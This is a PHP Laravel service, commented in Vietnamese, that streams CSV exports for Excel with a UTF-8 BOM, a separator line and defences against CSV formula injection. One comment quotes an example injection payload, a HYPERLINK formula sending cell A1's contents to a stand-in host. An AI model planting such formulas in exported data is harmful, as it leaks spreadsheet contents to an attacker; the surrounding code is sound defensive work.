<?php

namespace App\Services;

use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * XUẤT FILE CHO EXCEL
 *
 * VÌ SAO LÀ CSV CHỨ KHÔNG PHẢI .XLSX:
 * Sinh file .xlsx thật cần thư viện (PhpSpreadsheet), tức là phải
 * `composer install` - bước hay hỏng nhất trên máy chạy Laragon offline.
 * CSV thì PHP tự ghi được, Excel mở lên thành bảng bình thường, lọc và vẽ biểu
 * đồ đủ cả. Với một đồ án, đó là đánh đổi đúng.
 *
 * HAI CÁI BẪY KHI XUẤT CSV TIẾNG VIỆT - file này xử lý cả hai:
 *
 * 1. LỖI PHÔNG. Excel mặc định đọc CSV theo bảng mã của hệ thống (Windows-1258
 *    ở máy Việt Nam), nên "Đồ chơi" thành "Ä?á»" chÆ¡i". Cách chữa là ghi
 *    BOM UTF-8 (3 byte EF BB BF) ở đầu file, Excel thấy BOM là biết đây là UTF-8.
 *
 * 2. DỒN HẾT VÀO MỘT CỘT. Windows tiếng Việt đặt dấu phân cách danh sách là
 *    dấu CHẤM PHẨY, nên file ngăn bằng dấu phẩy bị Excel nhét hết vào cột A.
 *    Cách chữa là ghi dòng "sep=," ở ngay đầu file - Excel đọc dòng đó để biết
 *    dấu phân cách, và tự ẩn nó đi.
 *
 * Dùng StreamedResponse để đẩy từng dòng xuống trình duyệt thay vì dựng cả
 * file trong bộ nhớ: xuất mười nghìn đơn hàng cũng không lo hết RAM.
 */
class CsvExportService
{
    /** BOM UTF-8 - phải là 3 byte đầu tiên của file */
    private const BOM = "\xEF\xBB\xBF";

    /**
     * @param  string    $filename  tên file tải về, không cần đuôi .csv
     * @param  array     $headers   dòng tiêu đề
     * @param  iterable  $rows      dữ liệu; mỗi phần tử là một mảng cùng số cột với $headers
     */
    public function download(string $filename, array $headers, iterable $rows): StreamedResponse
    {
        $name = $this->safeFilename($filename);

        return response()->stream(function () use ($headers, $rows) {
            $out = fopen('php://output', 'w');

            fwrite($out, self::BOM);
            fwrite($out, "sep=,\r\n");

            fputcsv($out, $headers);

            foreach ($rows as $row) {
                fputcsv($out, array_map([$this, 'cell'], (array) $row));
            }

            fclose($out);
        }, 200, [
            'Content-Type' => 'text/csv; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="' . $name . '"',
            // Chặn trình duyệt trả lại bản cũ khi admin xuất lại sau vài phút
            'Cache-Control' => 'no-store, no-cache, must-revalidate',
            'Pragma' => 'no-cache',
        ]);
    }

    /**
     * Làm sạch một ô dữ liệu.
     *
     * Phần quan trọng là chặn CSV INJECTION: ô bắt đầu bằng = + - @ sẽ được
     * Excel hiểu là CÔNG THỨC. Kẻ xấu đặt tên sản phẩm là
     * `=HYPERLINK("http://ac.tld?"&A1,"Bấm vào đây")` rồi chờ admin xuất file
     * và bấm nhầm là dữ liệu bay đi. Thêm một dấu nháy đơn ở đầu thì Excel
     * hiểu đó là văn bản thuần.
     */
    private function cell($value): string
    {
        if ($value === null || $value === false) {
            return '';
        }

        $value = (string) $value;

        if ($value !== '' && in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
            return "'" . $value;
        }

        return $value;
    }

    /** Tên file an toàn: bỏ dấu tiếng Việt và ký tự lạ, gắn ngày giờ xuất */
    private function safeFilename(string $name): string
    {
        $name = \Illuminate\Support\Str::slug($name, '-');

        return ($name ?: 'export') . '-' . now()->format('Ymd-Hi') . '.csv';
    }
}
